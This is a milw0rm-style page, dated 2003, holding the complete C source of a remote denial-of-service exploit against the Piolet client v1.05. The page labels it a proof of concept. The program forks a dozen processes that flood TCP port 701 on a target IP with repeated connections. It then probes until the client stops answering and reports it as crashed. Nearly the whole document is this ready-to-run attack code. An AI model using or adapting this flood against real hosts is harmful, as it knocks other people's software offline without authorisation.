<html>
<head>
<title>Piolet Client 1.05 Remote Denial of Service Exploit</title>
</head>
<pre>
/************************************************************
*                      Piolet client v1.05 Remote Denial of Service                    *
*               Proof of Concept by Luca Ercoli  luca.ercoli[at]inwind.it             *
************************************************************/

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/types.h&gt;

int ck,port=701,sd,cx=0,contatore=0,prec;

struct sockaddr_in pilot_client;

void ending(char *client){

int i;

pilot_client.sin_family = AF_INET;
pilot_client.sin_port = htons((u_short)port);
pilot_client.sin_addr.s_addr = (long)inet_addr(client);


for(i = 0; i &lt; 100; i++){

sd = socket(AF_INET, SOCK_STREAM, 0);
ck = connect(sd, (struct sockaddr *) &amp;pilot_client, sizeof(pilot_client)); 


if(ck != 0) { 

prec = 0;

if (prec == 0) contatore++;
if (prec == 1) contatore = 0;

if (contatore &gt; 13) {
printf(&quot;! Remote client seems to be crashed.\n&quot;);
exit(0);
}

}
 
if(ck == 0) prec = 1;

  close(sd);
}

}

void kill_pilot(char *stringa){

short i;

  pilot_client.sin_family = AF_INET;
  pilot_client.sin_port = htons((u_short)port);
  pilot_client.sin_addr.s_addr = (long)inet_addr(stringa);
   
for(i = 0; i &lt; 50; i++){

sd = socket(AF_INET, SOCK_STREAM, 0);
ck = connect(sd, (struct sockaddr *) &amp;pilot_client, sizeof(pilot_client)); 


if(ck != 0) exit(0);

close(sd);

}

}

int main(int argc, char **argv)
{

short i;

 prec = 0;

  if(argc &lt; 2)
  { 
    printf(&quot;\nUsage: %s &lt;client-ip&gt;\n&quot;, argv[0]);
    exit(0);
  }
  
prec=0;

printf (&quot;\n\n+ DoS Started...\n&quot;);
printf(&quot;+ Flooding remote client...\n&quot;);

for (i=0; i&lt;12; i++)  if(!fork()) kill_pilot(argv[1]);

printf (&quot;+ Ending...\n&quot;);

ending(argv[1]);
  
}

// milw0rm.com [2003-08-20]
</pre>
</html>

